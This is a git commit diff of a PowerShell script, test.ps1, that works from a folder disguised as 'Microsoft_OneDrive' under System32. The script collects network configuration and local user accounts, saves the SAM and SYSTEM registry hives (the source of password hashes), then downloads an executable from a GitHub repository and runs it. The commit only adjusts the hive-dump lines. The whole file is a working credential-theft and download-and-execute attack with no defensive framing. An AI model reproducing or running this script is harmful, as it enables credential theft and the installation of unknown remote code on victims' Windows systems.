7075bd01b5343e01be90c0305c49f1d152d511e3
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-03 14:23:14 -0600

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,7 +1,12 @@
 cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
 ipconfig /all | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
 net user | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
-reg save HKLM\sam ./sam.save | echo y
-reg save HKLM\system ./system.save | echo y
+reg save HKLM\sam ./sam.save 
+echo y | powershell 
+reg save HKLM\system ./system.save
+echo y | powershell
+
+
+
 iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
 Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
